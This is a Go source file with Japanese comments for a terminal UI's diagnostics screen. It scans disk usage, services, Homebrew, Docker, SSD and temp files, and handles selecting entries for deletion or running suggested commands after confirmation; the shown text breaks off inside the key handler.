// Package doctorview は glogx の doctor 画面 (D): ディスク・サービス・brew・docker・SSD の診断の表示と、
// 選んだ項目の削除の確認と実行。判定は doctor module (doctor/disk・svc・docker・ssd) を直接呼ぶ。
// 画面の開閉・横断・トーストは main の browseModel が仲介する (この package は main を import できない)。
package doctorview

import (
	"context"
	"fmt"
	"github.com/jiikko/dotfiles/src/tuikit/layout"
	"github.com/jiikko/dotfiles/src/tuikit/listnav"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	tea "charm.land/bubbletea/v2"

	"doctor/disk"
	"doctor/docker"
	"doctor/runner"
	"doctor/ssd"
	"doctor/svc"
	"glogx/internal/app"
	"glogx/internal/crosskey"
	"glogx/internal/term"
	"tmpclean"
)

// doctor (D キー) — 環境の健全性診断を並べる全画面ビュー。
//
// 器は「診断項目のセクション列」。doctor 自体はディスクやサービスを知らず、各セクションを
// 見出し (案 A: 左に縦棒、右端に要約、下に罫線) と行の列で並べるだけ。今回は 3 セクション:
// ディスク占有 (doctor/disk) / サービス (doctor/svc) / Homebrew (brew doctor の転記)。
//
// 行は「選べる行」(カーソルが止まる) と「補足行」からなる。Enter で選んだ行の詳細をその場に
// インライン展開する (ディスク = 中身 / 内訳、Homebrew = 警告の本文)。一覧は概要だけ、詳細は選んでから
// (ユーザー決定 2026-09-02)。④ の Space / d もこのカーソルに乗る。
//
// スキャンは**開いた時に始める** (起動時には走査しない。起動時は前回の結果を読んでトーストを出すだけ
// = doctor_cache.go)。終わったセクションから順に埋まる。
//
// 🚨 走査は ctx で束ね、閉じる / quit (cancelAll) で必ず cancel する。glogx は popup 運用で開閉が
// 頻繁なので、残留するとディスク I/O を飽和させる (3 章「終了時の後始末」)。
// 🚨 disk.Scan の OnResult は走査 goroutine から並行に呼ばれるので、channel に載せて Cmd で 1 件ずつ
// Msg にする (Update の外で状態を触らない)。
// DoctorTab は一覧のタブ。
//
// 🚨 **分割の目的は「印を付けた後にやることをタブごとに 1 つにする」こと。**
// 1 つの一覧に disk の d (削除) と brew の x (実行) が同時に出ていると、
// 両方をチェックできてしまい「チェックしたもの」と「実行されるもの」が一致しない。
// Space は空いていても**後続キーが衝突していた** (ユーザー指摘 2026-09-04)。
// 一望性はタブ行に 3 つとも件数を出すことで保つ (どのタブに何件あるかは切り替えずに分かる)。
type DoctorTab int

const (
	TabDisk DoctorTab = iota
	TabSvc
	TabBrew
	TabDocker
	TabSSD
	TabTmp
)

// numDoctorTabs はタブの数。**enum の番兵にしない** — DoctorTab の値として持つと
// exhaustive の switch すべてに「タブでない値」の case を書かされる
const numDoctorTabs = 6

type DoctorView struct {
	shown bool
	// wantCross は横断先 (DoctorCross を返したときだけ意味を持つ。takeWantCross で取り出す)
	wantCross string
	// tab は表示中のタブ。tabCur はタブごとのカーソル (切り替えても位置が戻る)
	tab    DoctorTab
	tabCur [numDoctorTabs]rowCursor
	gen    int // 開くたびに進める。閉じた後に届く古い Msg を捨てる
	cancel context.CancelFunc

	diskResults []disk.Result // 完了順
	diskTotal   int           // カタログのエントリ数 (進捗の分母)
	diskRep     *disk.Report  // 完了後 (nil = 走査中)
	diskCh      chan doctorDiskEvent
	svcRep      *svc.Report // nil = 走査中
	brew        *brewDoctorResult
	// docker は nil = 走査中。🚨 キャッシュ (snapshot) には載せない — 走査が速いので
	// 開くたびに取り直す (doctor_docker.go の冒頭)
	docker *docker.Report
	// ssd は nil = 走査中。docker と同じくキャッシュに載せない (doctor_ssd.go の冒頭)
	ssd *ssd.Report
	// tmp は nil = 数えている途中。ssd と同じくキャッシュに載せない (doctor_tmp.go の冒頭)
	tmp        *tmpReport
	startedAt  time.Time
	snapshotAt time.Time // 前回の結果をそのまま出しているときの走査時刻 (zero = 今回走査した)

	// enterDetail は「Enter で今開いた行」。次の描画でカーソルをその中の最初の対象パスへ移す
	// (開いてから j を何度も押さずに、消したいディレクトリへ直接行けるようにする)
	enterDetail rowKey
	// cur は行の上のカーソルと窓 (doctor_rowcursor.go)。行の列しか知らない閉じた機械なので、
	// 不変条件はそちらのテストが行の列を直接与えて検査する
	cur      rowCursor
	expanded map[rowKey]bool // 展開中の行 (key = 行の同一性)
	rows     []doctorRow     // 直近の描画で組んだ行 (キー操作の対象。lines() が作り直す)

	pendingCopy string         // 直近の y / Y の中身 (copyPayload)
	copyNoun    string         // 直近の y でコピーした中身の語 (CopyNoun)
	notice      string         // 直近の DoctorToast の文言 (TakeNotice)
	noticeKind  app.NoticeKind // notice の重さ (成功 / 断り / エラー。main が deliverNotice で出し分ける)

	// ④ 削除 (doctor_delete.go)。selected はエントリ ID、inspected は「Enter で中身を一度開いた」印
	// (risk: confirm の行はこれが立つまで選べない)。
	selected map[entryID]bool
	// selectedItems は**ディレクトリ単位**の選択 (key = diskItemKey)。エントリ全体を選ぶ
	// selected とは別に持つ: 「エントリを丸ごと」と「その中の一部」は意図が違う
	selectedItems map[itemKey]bool
	// selectedActions は brew の手の選択 (key = **コマンド文字列**)。
	// 🚨 行の key ("brewact:i:j") で持たない: 再スキャンで警告の並びが変わると別の手を指す。
	// コマンドそのものは「何を実行するか」の同一性そのものなので、ずれない
	selectedActions map[cmdKey]bool
	// actionByCmd は直近の描画で組んだ手の実体 (key = コマンド)。確認画面がラベルと
	// 注記を引くため。行のテキストから復元しない (色と印が混ざっていて壊れやすい)
	actionByCmd map[cmdKey]doctorCmdAction
	// dockerOrder は Docker タブの手を**描画順**で覚える (畳まれている行も含む)
	dockerOrder      []cmdKey
	inspected        map[entryID]bool
	del              doctorDelete
	pendingDeleteCmd tea.Cmd // handleKey が組んだ削除の Cmd (browseModel が取り出して返す)

	// deps は外へ出る口 (zero value = 本番。SetDeps で差し替える)
	deps Deps
}

// Deps は doctor 画面が外へ出る口 (走査・brew・docker・SSD・削除)。項目が nil なら本番の実装を使う。
// 本番の main は差し替えない (zero value のまま)。browseModel と組み合わせる main のテストが fake を差す
// (fake は internal/doctorview/doctortest の FakeDeps。あちらは同じ形の構造体を持ち、変換して渡す)。
type Deps struct {
	DiskOpts   func() disk.Options
	SvcOpts    func() svc.Options
	BrewRun    runner.Runner
	DockerOpts func() docker.Options
	SSDOpts    func() ssd.Options
	DeleteOpts func() disk.DeleteOptions
	DeleteFn   func(context.Context, []disk.Result, disk.DeleteOptions) (disk.DeleteReport, error)
	TmpCount   func(context.Context) (tmpclean.Counts, error)
	RepoTmpDir func() string
}

// SetDeps は外へ出る口を差し替える。
func (v *DoctorView) SetDeps(d Deps) { v.deps = d }

// deleteOptions は削除の実行口。走査と同じ Env / Runner を使う (判定の材料を 2 つ持たない)。
func (v *DoctorView) deleteOptions() disk.DeleteOptions {
	if v.deps.DeleteOpts != nil {
		return v.deps.DeleteOpts()
	}
	return disk.DeleteOptions{Env: disk.RealEnv(), Run: runner.Exec}
}

// doctorRow は 1 行。selectable な行だけにカーソルが止まる。detail は Enter で展開する本文。
type doctorRow struct {
	text       string
	selectable bool
	key        rowKey
	// detail は Enter で展開したときに描く本文。
	// 🚨 **展開している行だけ**が値を持つ。畳まれている行のぶんまで毎フレーム
	// 組むと、1 フレームのコストがカタログ全エントリの Items / Contents の総数に比例する。
	// 「展開できるか」は len(detail) でなく hasDetail で判定すること。
	detail []doctorRow
	// hasDetail は「Enter で展開できる行か」。detail が畳まれていて空でも真になる。
	hasDetail bool
	// copyKind は copyPath の中身の種類。y の案内とトーストの語はカーソル行のこの値から決める
	// (タブから推測しない: Homebrew タブには警告の見出しの行とコマンドの行が混ざる)。
	// hasDetail の直後に置くのは、bool の後の詰め物に収めて行を太らせないため (1 フレームの確保の予算)
	copyKind copyKind
	// copyPath は y でコピーするパス (複数なら改行区切り)。copyText は Y でコピーする解説文
	// (ラベル・パス・復元方法・リスク・削除経路・提示コマンド。別セッションの LLM にそのまま投げられる形)。
	copyPath string
	copyText string
}

// copyKind は y でコピーする中身の種類 (zero value はパス)。
type copyKind uint8

const (
	copyKindPath copyKind = iota
	copyKindCommand
	copyKindWarning
	copyKindError
)

// hint は最下行の y の案内。毎フレーム描くので連結せず定数を返す (1 フレームの確保の予算)。
func (k copyKind) hint() string {
	switch k {
	case copyKindCommand:
		return "y: コマンドをコピー"
	case copyKindWarning:
		return "y: 警告をコピー"
	case copyKindError:
		return "y: エラーをコピー"
	case copyKindPath:
	}
	return "y: パスをコピー"
}

// noun は案内とトーストに出す語。
func (k copyKind) noun() string {
	switch k {
	case copyKindCommand:
		return "コマンド"
	case copyKindWarning:
		return "警告"
	case copyKindError:
		return "エラー"
	case copyKindPath:
	}
	return "パス"
}

// doctorDiskEvent は disk.Scan からの 1 イベント (r = 1 エントリ完了 / rep = 全完了)。
type doctorDiskEvent struct {
	r   *disk.Result
	rep *disk.Report
}

type doctorDiskMsg struct {
	gen int
	ev  doctorDiskEvent
}

type doctorSvcMsg struct {
	gen int
	rep svc.Report
}

type doctorBrewMsg struct {
	gen int
	res brewDoctorResult
}

func (v *DoctorView) Visible() bool { return v.shown }

// scanning はいずれかのセクションが走査中か (スピナーの根拠)。
func (v *DoctorView) Scanning() bool {
	return v.shown && (v.diskRep == nil || v.svcRep == nil || v.brew == nil || v.docker == nil || v.ssd == nil || v.tmp == nil)
}

// deleting は削除の下見 / 実行中か (スピナーと再描画の根拠)。
//
// 🚨 **scanning() では代用できない。** あちらは 3 つのレポートが nil のあいだ (= 初回スキャン中)
// だけ true になるので、削除に入る頃には必ず false。この述語が無いと spinnerActive() が
// false のままになり、**engine のイベントとイベントの合間に 1 度も再描画されない**。
// OnProgress はエントリ 1 個が終わるたびにしか出ないため、重いエントリでは数十秒
// 画面が完全に静止する = 文字どおり固まる (ユーザー報告 2026-09-04)。
func (v *DoctorView) Deleting() bool { return v.shown && v.del.blocking() }

// Receive は doctor の非同期の結果 (走査・削除) を受け取る。doctor の Msg でなければ ok=false。
// cmd は次に待つもの、toast は画面の外へ出す知らせ ("" = 無し。SSD の警告)。
func (v *DoctorView) Receive(msg tea.Msg) (cmd tea.Cmd, toast string, ok bool) {
	switch msg := msg.(type) {
	case doctorDiskMsg:
		return v.receiveDisk(msg), "", true
	case doctorDeleteMsg:
		return v.receiveDelete(msg), "", true
	case doctorSvcMsg:
		v.receiveSvc(msg)
		return nil, "", true
	case doctorDockerMsg:
		v.receiveDocker(msg)
		return nil, "", true
	case doctorSSDMsg:
		return nil, v.receiveSSD(msg), true
	case doctorTmpMsg:
		return nil, v.receiveTmp(msg), true
	case doctorBrewMsg:
		v.receiveBrew(msg)
		return nil, "", true
	}
	return nil, "", false
}

// toggle は開閉。開くときにスキャンを始める Cmd を返す。
func (v *DoctorView) Toggle() tea.Cmd {
	if v.shown {
		v.close()
		return nil
	}
	return v.open()
}

// open は開いて走査を始める。🚨 直近 doctorSnapshotTTL 以内の完全な結果があれば走査せずそれを出す
// (popup の開閉のたびにスキャンが走って見えるのを避ける)。r (rescan) は snapshot を無視する。
func (v *DoctorView) open() tea.Cmd { return v.start(false) }

// catalogHas は「この ID が実効カタログにあるか」を返す (テストは diskOpts で catalog を差し替える)。
// catalogLookup は ID から**今のカタログの Entry** を引く関数を返す (テストは diskOpts で差し替える)。
// 在るかどうかだけでなく Entry を返すのは、復元した Result の表示文言をカタログ側へ
// 束ね直すため。
func (v *DoctorView) catalogLookup() func(string) (disk.Entry, bool) {
	if v.deps.DiskOpts != nil {
		if cat := v.deps.DiskOpts().Catalog; len(cat) > 0 {
			byID := make(map[string]disk.Entry, len(cat))
			for _, e := range cat {
				byID[e.ID] = e
			}
			return func(id string) (disk.Entry, bool) {
				e, ok := byID[id]
				return e, ok
			}
		}
	}
	return disk.CatalogEntry
}

// rescan は snapshot を無視して走査し直す (r)。
func (v *DoctorView) Rescan() tea.Cmd { return v.start(true) }

func (v *DoctorView) start(force bool) tea.Cmd {
	// 🚨 **前世代を止めてから世代を進める**。rescan (r) は
	// start(true) を直接呼ぶので、ここで止めないと前世代の disk goroutine を誰も cancel できず、
	// latch に載ったまま完走する = WaitDoctorCleanup の上限が「cancel + WaitDelay 2 秒」ではなく
	// PerEntry 60 秒 × 並列度 (約 6 分) になる。latch を入れる前は即終了だったので、
	// これが無いと 211 が hang を新設することになる
	v.Stop()
	v.shown = true
	v.gen++
	v.cur.reset()
	v.expanded = map[rowKey]bool{}
	v.selected, v.selectedItems, v.inspected = map[entryID]bool{}, map[itemKey]bool{}, map[entryID]bool{}
	// 🚨 コマンドの選択も捨てる。残すと、doctor を閉じて開き直したときに `*` が付いたまま
	// 「x: 1 件を実行」で復帰する (ディスク側の選択は毎回消えるので非対称だった。
	// 共有 map に prune 系が載った時点で意味が変わった)
	v.selectedActions, v.actionByCmd, v.dockerOrder = map[cmdKey]bool{}, map[cmdKey]doctorCmdAction{}, nil
	// 🚨 世代をまたいで残る状態をここで**まとめて**捨てる。1 つでも残すと前の世代の行・文言・
	// Cmd が次の画面に混ざる (notice は実際に漏れて、次の再スキャンの理由として
	// 再表示されていた)
	v.rows, v.enterDetail, v.pendingCopy, v.notice, v.pendingDeleteCmd = nil, "", "", "", nil
	v.del.reset()
	v.diskResults, v.diskRep, v.svcRep, v.brew, v.docker, v.ssd, v.tmp = nil, nil, nil, nil, nil, nil, nil
	v.startedAt = app.TimeNow()
	v.snapshotAt = time.Time{}
	if !force {
		if sn, ok := loadDoctorSnapshot(app.TimeNow()); ok {
			rep := sn.Disk
			// 実効カタログに無い ID は落とす (snapshot は書き換えられる)
			rep = rep.WithResults(doctorSnapshotInCatalog(rep.Results, v.catalogLookup()))
			v.diskRep = &rep
			v.diskResults = rep.Results
			svcRep := sn.Svc
			v.svcRep = &svcRep
			brew := sn.Brew
			v.brew = &brew
			v.snapshotAt = sn.ScannedAt
			// 🚨 docker と ssd は snapshot に載せていないので、復元経路でも走らせる
			// (走らせないとそのタブが永久にスピナーのままになる)
			ctx, cancel := context.WithCancel(context.Background())
			v.cancel = cancel
			return tea.Batch(v.uncachedCmds(ctx, v.gen)...)
		}
	}
	ctx, cancel := context.WithCancel(context.Background())
	v.cancel = cancel
	gen := v.gen

	dOpt := disk.Options{Env: disk.RealEnv(), Run: runner.Exec}
	if v.deps.DiskOpts != nil {
		dOpt = v.deps.DiskOpts()
	}
	if !force {
		// TTL を過ぎて走査し直すときも、重かったエントリは前回の値を使う (ディスク I/O を節約)
		sn, ok := loadDoctorSnapshotAny()
		dOpt.Reuse = doctorReuseFrom(sn, ok, app.TimeNow())
	}
	catalogN := len(dOpt.Catalog)
	if catalogN == 0 {
		catalogN = disk.CatalogSize()
	}
	v.diskTotal = catalogN
	// 容量 = OnResult の回数 (カタログ数) + 完了 1 件。閉じた後に誰も読まなくても走査 goroutine は詰まらない
	ch := make(chan doctorDiskEvent, catalogN+1)
	v.diskCh = ch
	dOpt.OnResult = func(r disk.Result) { ch <- doctorDiskEvent{r: &r} }
	// latch へ登録する: 再起動・終了の直前に子プロセスの帰還を看取るため。
	// doctorTrack は Add を呼び出し元の goroutine で済ませるので、Wait が登録を追い越さない
	doctorCleanup.Add()
	go func() {
		defer doctorCleanup.Done()
		rep := disk.Scan(ctx, dOpt)
		ch <- doctorDiskEvent{rep: &rep}
	}()

	sOpt := svc.Options{Run: runner.Exec}
	if v.deps.SvcOpts != nil {
		sOpt = v.deps.SvcOpts()
	} else if home, err := os.UserHomeDir(); err == nil {
		sOpt.Dirs = svc.DefaultDirs(home, os.Getuid())
	}
	bRun := v.deps.BrewRun
	if bRun == nil {
		bRun = runner.Exec
	}
	// 🚨 svc / brew は tea.Cmd の goroutine で走る。bubbletea は Run を抜けるときに
	// Cmd の goroutine を待たないので、latch で看取る側を作っておく
	return tea.Batch(append([]tea.Cmd{
		v.waitDiskCmd(gen),
		func() tea.Msg {
			var rep svc.Report
			doctorTrack(func() { rep = svc.Scan(ctx, sOpt) })
			return doctorSvcMsg{gen: gen, rep: rep}
		},
		func() tea.Msg {
			var res brewDoctorResult
			doctorTrack(func() { res = runBrewDoctor(ctx, bRun) })
			return doctorBrewMsg{gen: gen, res: res}
		},
	}, v.uncachedCmds(ctx, gen)...)...)
}

// uncachedCmds は snapshot に載せない (開くたびに取り直す) 走査。復元と新規の 2 経路が同じ集合を
// 起こすよう 1 箇所にまとめる (片方にだけ足すと、そのタブが復元経路でスピナーのまま残る)。
// 🚨 tea.Batch で包まず列で返す: 包むと start の Batch が入れ子になり、1 段だけ開いて Cmd を
// 走らせる検査 (TestEachDoctorScanIsTrackedUntilItReturns) から中の走査が見えなくなる
func (v *DoctorView) uncachedCmds(ctx context.Context, gen int) []tea.Cmd {
	return []tea.Cmd{v.dockerCmd(ctx, gen), v.ssdCmd(ctx, gen), v.tmpCmd(ctx, gen)}
}

// waitDiskCmd は channel から 1 イベント取り出して Msg にする (受け取り側が再アームする)。
func (v *DoctorView) waitDiskCmd(gen int) tea.Cmd {
	ch := v.diskCh
	return func() tea.Msg {
		ev, ok := <-ch
		if !ok {
			return nil
		}
		return doctorDiskMsg{gen: gen, ev: ev}
	}
}

// close は走査を止めて閉じる。ディスクが未完了なら完了済みの分を partial としてキャッシュに書く
// (savePartialOnClose が守る条件のもとで)。
func (v *DoctorView) close() {
	v.del.reset() // 相を残さない (今は handleDeleteKey が閉じるキーを飲むので不到達だが、並び順に依存させない)
	v.Stop()
	v.shown = false
	if v.diskRep == nil && len(v.diskResults) > 0 {
		results := append([]disk.Result(nil), v.diskResults...)
		sort.SliceStable(results, func(a, b int) bool { return results[a].Size > results[b].Size })
		rep := disk.Report{ScannedAt: app.TimeNow(), Partial: true}.WithResults(results)
		v.saveCache(rep)
	}
}

// stop は走査だけを止める (cancelAll から呼ぶ後始末。画面の状態は触らない。partial も保存しない)。
func (v *DoctorView) Stop() {
	// 削除の途中で外から終了させられたら、**ctx で中断を伝える** (プロセスを殺すだけだと
	// 記録が executing のまま残り、cli: の子プロセスが孤児になる)。
	// 🚨 cancel だけでは**子プロセスの死を待たない**。cancelAll → WaitDoctorCleanup の
	//    順で看取ること。削除も doctorCleanup latch に載っている (doctor_delete.go)
	if v.del.cancel != nil {
		v.del.cancel()
	}
	if v.cancel != nil {
		v.cancel()
		v.cancel = nil
	}
}

// saveCache は結果をキャッシュへ。**不完全さの種類ごとに扱いを分ける**。
// 時間で区切る形は採らない: 「前回の完全結果の古さ」は「今回の結果が途中経過か」と無関係で、
// doctor をたまにしか開かない普通の運用が丸ごと無保護になる (実測 2026-09-03:
// 3 時間前の 45GB が、開いて即 Esc の 1MB で潰れた)。
//
//	partial (中断)     : 🚨 完全な結果を潰さない。Esc や r の直後の数件だけの結果で 45GB を 200MB に
//	                     置き換えると、起動トーストが閾値未満で無期限に沈黙する。
//	                     **これは doctorCacheFromReport が前回の記録に重ねて書く
//	                     ことで構造的に防ぐ**。「合計が前回より小さければ書かない」という
//	                     ガードは置かない。重ねる今それは冗長で、しかも
//	                     「今回実際に測り直して縮んだと分かったエントリ」まで古い値へ差し戻す
//	                     副作用がある
//	Reused を含む完了  : 書く。ただし再利用したエントリの数字は**前回の実測値を引き継ぐ**
//	                     (doctorCacheFromReport)。「Reused があれば書かない」にすると、重いエントリが
//	                     複数あるときに恒久的に凍結する
//	failed を含む完了  : 書く。走査は完走していて、その環境の現実がそれ。書かないと「1 エントリが
//	                     恒久的に測れない Mac」でキャッシュが永久に凍結する。沈黙は Failed 件数を
//	                     キャッシュに持たせ、トースト側で「N 件は診断できず」を出して防ぐ
func (v *DoctorView) saveCache(rep disk.Report) {
	prev, _ := loadDoctorDiskCache()
	_ = saveDoctorDiskCache(doctorCacheFromReport(rep, prev)) // 保存失敗は表示に影響しない
}

// receiveDisk は disk のイベントを受ける。完了なら nil、途中なら次を待つ Cmd を返す。
func (v *DoctorView) receiveDisk(msg doctorDiskMsg) tea.Cmd {
	if msg.gen != v.gen || !v.shown {
		return nil
	}
	// 🚨 **ここが live 経路の唯一の関門**。走査した値はパスも Contents も
	// 「自分以外が書いた文字列」で、無害化せずに持つと doctorRow.text と `y` / `Y` の
	// コピーへ生のまま乗る (コピーは pbcopy 経由なので、貼った先の端末で発火する)。
	// 出所ごとに書き分けず、モデルへ入る前に 1 回通す。CLI (diskdoctor の Format) と
	// **同じ関数**を使う (判定を 2 実装持たない)。
	if msg.ev.rep != nil {
		rep := disk.SanitizeForDisplay(*msg.ev.rep)
		v.diskRep = &rep
		v.saveCache(rep) // Partial な完了 (中断) も saveCache の規律の中で扱う
		v.maybeSaveSnapshot()
		return nil
	}
	if msg.ev.r != nil {
		v.diskResults = append(v.diskResults, disk.SanitizeResultForDisplay(*msg.ev.r))
	}
	return v.waitDiskCmd(msg.gen)
}

func (v *DoctorView) receiveSvc(msg doctorSvcMsg) {
	if msg.gen != v.gen || !v.shown {
		return
	}
	rep := svc.SanitizeForDisplay(msg.rep) // live も復元と同じ関門を通す (issue 228)
	v.svcRep = &rep
	v.maybeSaveSnapshot()
}

func (v *DoctorView) receiveBrew(msg doctorBrewMsg) {
	if msg.gen != v.gen || !v.shown {
		return
	}
	// 🚨 brew の警告本文は**複数行が正常**なので、改行だけ残す版で通す (1 行 1 件の
	// ディスク節とは別扱い。cleanBrewText の doc 参照)
	res := cleanLiveBrew(msg.res)
	v.brew = &res
	v.maybeSaveSnapshot()
}

// maybeSaveSnapshot は 3 セクションが揃った時点で完全な結果を書く (TTL 内の開き直しで再利用)。
func (v *DoctorView) maybeSaveSnapshot() {
	if v.diskRep == nil || v.svcRep == nil || v.brew == nil || v.diskRep.Partial {
		return
	}
	_ = saveDoctorSnapshot(doctorSnapshot{ScannedAt: app.TimeNow(), Disk: *v.diskRep, Svc: *v.svcRep, Brew: *v.brew})
}

// doctorAction は handleKey の結果 (rlDash と同じ語彙)。
type doctorAction int

const (
	DoctorSwallow doctorAction = iota // 全画面なので裏の一覧へ素通りさせない
	DoctorClosed
	DoctorRescan    // r: 走査し直す (browseModel が open() で起こす。close は経由しない = partial を書かない)
	DoctorCopyPath  // y: 選んだ行のパスをコピー (中身は copyPayload)
	DoctorCopyText  // Y: 選んだ行の解説文をコピー (同上)
	DoctorNothing   // y/Y を押したがコピーするものが無い (browseModel がその旨をトーストにする)
	DoctorToast     // 削除の導線が理由を出したい (TakeNotice)
	DoctorCopyLog   // 削除の実行記録をコピー (y。トーストの文言が「解説」ではないので分ける)
	DoctorRunDelete // 削除を開始する (pendingDeleteCmd を browseModel が実行する)
	DoctorCross     // 別の全画面へ横断 (doctor は閉じ済み。行き先は takeWantCross)
)

// jumpIntoDetail は Enter で開いた直後に、カーソルを**その中の最初の対象パス**へ移す。
// 開いてから j を何度も押さずに、消したいディレクトリへ直接行けるようにする
// (ユーザー要望 2026-09-03)。対象パスの行が無い (Inspect の中身一覧だけ / 走査できず) なら
// 何もしない = カーソルはエントリの行に留まる。
// expandableRow はカーソル行が開閉できるか (開ける詳細を持つ選択可能な行) と、その key。
func (v *DoctorView) expandableRow() (rowKey, bool) {
	if v.cur.index < 0 || v.cur.index >= len(v.rows) {
		return "", false
	}
	r := v.rows[v.cur.index]
	if !r.selectable || !r.hasDetail {
		return "", false
	}
	return r.key, true
}

// collapseTargetAtCursor は「今このカーソル位置で畳めるもの」を返す。
//
// 🚨 **畳めるかの判定はここだけに書く。** collapsibleAtCursor (hint の文言) と
// collapseAtCursor (実際に畳む) に `ok && v.expanded[k]` を別々に持たせない。片方を直しても
// 挙動が変わらなくなる。
//
// 🚨 ここで `v.rows[i].detail` を見て「本当に中身があるか」を確かめないこと。rows は描画時に
// 遅延再構築されるので、Enter 直後 (次の lines() の前) は展開済みの行でも detail が nil で、
// 「畳むものが無い」と誤答する (実測 2026-09-06: 既存テスト 2 本が落ちた)。
// 「展開しても 0 行」の行は hasDetail を立てない側で解決する (diskHasDetail / brewHasDetail)。
func (v *DoctorView) collapseTargetAtCursor() (key rowKey, viaParent, ok bool) {
	if v.cur.index >= 0 && v.cur.index < len(v.rows) {
		if parent, isChild := parentRowKey(v.rows[v.cur.index].key); isChild {
			return parent, true, true
		}
	}
	k, expandable := v.expandableRow()
	if !expandable || !v.expanded[k] {
		return "", false, false
	}
	return k, false, true
}

// collapsibleAtCursor は「今このカーソル位置で畳めるものがあるか」。Enter / q が畳むか
// どうかと、hint の文言がここを唯一の出典にする。
func (v *DoctorView) collapsibleAtCursor() bool {
	_, _, ok := v.collapseTargetAtCursor()
	return ok
}

// collapseAtCursor はカーソル位置の展開を 1 段閉じる。畳んだら true。
// 対象パスの行に居るなら**親のエントリを畳んでカーソルを親へ戻し** (入る側だけ作ると
// カーソルが中に居たまま畳めなくなる)、開いているエントリの行に居るならそれを畳む。
func (v *DoctorView) collapseAtCursor() bool {
	k, viaParent, ok := v.collapseTargetAtCursor()
	if !ok {
		return false
	}
	delete(v.expanded, k)
	if viaParent {
		v.cur.key = k
	}
	return true
}

// openRow は詳細を開く。disk のエントリは inspected を立て (risk: confirm の行はこれが
// 立つまで選べない)、カーソルを中の最初の対象パスへ移す。
func (v *DoctorView) openRow(k rowKey) {
	v.expanded[k] = true
	if id, ok := k.diskEntryID(); ok {
		if v.inspected == nil {
			v.inspected = map[entryID]bool{}
		}
		v.inspected[id] = true
		v.enterDetail = k
	}
}

func (v *DoctorView) jumpIntoDetail() {
	if v.enterDetail == "" {
		return
	}
	id, ok := v.enterDetail.diskEntryID()
	v.enterDetail = ""
	if !ok {
		return
	}
	v.cur.jumpTo(v.rows, diskItemsPrefix(id))
}

// takeCursorFellBack は「描画中に選択行が消えて寄せた」印を 1 回だけ取り出し、文言を返す。
//
// 🚨 **キーを飲まずに知らせる**ための seam。handleKey の先頭で `DoctorToast` を
// 返さない。それだと**その打鍵が空振りする** (q / esc / d / r / Enter が等しく 1 回死ぬ)。
// 呼ぶのは browseModel 側 (browse_screens.go の routeKeyToDoctor) で、handleKey を呼ぶ**前**にトーストを出す。
//
// 🚨 文言は**返り値で渡す**。notice に書くと、それを消すのは TakeNotice() だけなので、
// 次の再スキャンの理由として使い回される (実測 2026-09-03)。
func (v *DoctorView) TakeCursorFellBack() string {
	if !v.cur.takeFellBack() {
		return ""
	}
	return "選んでいた行が無くなったので近くの行へ移りました"
}

// refuse は main へ渡す「押したキーが効かなかった理由」を置く。重さ (noticeKind) を知らせと一緒に持ち、TakeNotice で返す:
// main が重さを決め打ちすると、成功やエラーを出すようになったときに、エラーが w でコピーできないか、成功が断りの色で出る
// (issues / status / filer / lan と同じ口)。成功やエラーを出すときは、重さを変える置き口をここに足す。
func (v *DoctorView) refuse(text string) {
	v.notice, v.noticeKind = text, app.NoticeRefused
}

// TakeNotice は溜めておいた知らせを取り出して空にする (同じ文言が次の操作で再び出ないように)。
func (v *DoctorView) TakeNotice() (string, app.NoticeKind) {
	t := v.notice
	v.notice = ""
	return t, v.noticeKind
}

// takeWantCross は押された横断キー (無ければ "") を一度だけ取り出す (viewer と同じ語彙)。
func (v *DoctorView) TakeWantCross() string {
	want := v.wantCross
	v.wantCross = ""
	return want
}

// copyPayload は直近の y / Y でコピーする文字列 (handleKey がセットし、browseModel が取り出す)。
func (v *DoctorView) CopyPayload() string { return v.pendingCopy }

// CopyNoun は直近の y でコピーした中身の語 (パス / コマンド / 警告)。トーストの文言に使う。
func (v *DoctorView) CopyNoun() string { return v.copyNoun }

func (v *DoctorView) HandleKey(key string, page int) doctorAction {
	// 削除の語彙が立っているあいだは、そちらが先にキーを取る
	// (確認中の y が「コピー」に化けない / 実行中に別の行へ移動できない)
	if act, taken := v.handleDeleteKey(key); taken {
		return act
	}
	// 横断キー (i / s / R。判定は crosskey.Is、行き先は main の CrossTarget)。D は自分自身なので下の「閉じる」に任せる。
	// 削除の確認・実行中は上で飲まれるのでここまで届かない
	if crosskey.Is(key) && key != "D" {
		v.close()
		v.wantCross = key
		return DoctorCross
	}
	switch key {
	case " ":
		if act, ok := v.snapshotRescan(); ok {
			return act // 前回の結果の上では、拒否せず取り直す
		}
		if why, ok := v.toggleSelect(); !ok {
			if why == "" {
				return DoctorSwallow
			}
			v.refuse(why)
			return DoctorToast
		}
		return DoctorSwallow
	case "tab", "l", "right":
		// 🚨 h/l は**タブ移動**。issues viewer が同じ語彙を持つ (tab/l/right = 次、
		// shift+tab/h/left = 前) ので、画面をまたいで意味を揃える (ユーザー選定 2026-09-04)。
		// 木の開閉は Enter に一本化した (開いた行で Enter がそのまま畳む)
		v.moveTab(1)
	case "shift+tab", "h", "left":
		v.moveTab(-1)
	case "d":
		if v.tab != TabDisk {
			// 🚨 タブごとに「印を付けた後にやること」を 1 つに保つ。ここで削除を許すと
			// 一覧に 2 つの実行キーが同居していた頃の混乱がタブ越しに戻る
			v.refuse("削除はディスクのタブで (tab で移動)")
			return DoctorToast
		}
		return v.beginDelete()
	case "x":
		// x は「提示したコマンドを実行する」。**削除 (d) と別のキーにする**: d は「消す」の語で、
		// brew install は消す操作ではない。同じキーに 2 つの意味を持たせない
		switch v.tab {
		case TabBrew:
			return v.beginBrewRun()
		case TabDocker:
			return v.beginDockerRun()
		case TabDisk, TabSvc, TabSSD, TabTmp:
			v.refuse("コマンドの実行は Homebrew か Docker のタブで (tab で移動)")
			return DoctorToast
		}
		return DoctorSwallow
	case "q":
		// 🚨 q は**まず「開いたものを閉じる」**。Enter で開いた先で q を押すと画面ごと消えるのは、
		// 開いた操作の取り消しとして重すぎる (ユーザー要望 2026-09-04)。
		// 畳むものが無いときだけ doctor を閉じる。**D と esc は無条件に閉じる**ので、
		// 「一発で抜ける手段」は常に残る
		if v.collapseAtCursor() {
			return DoctorSwallow
		}
		v.close()
		return DoctorClosed
	case "D", "esc":
		v.close()
		return DoctorClosed
	case "r":
		return DoctorRescan // 止めるのは start() の先頭 (issue 211)。ここで二重に呼ばない
	case "enter":
		// Enter で入って Enter で出る (対象パスの行なら親ごと畳んでカーソルを親へ戻す)
		if v.collapseAtCursor() {
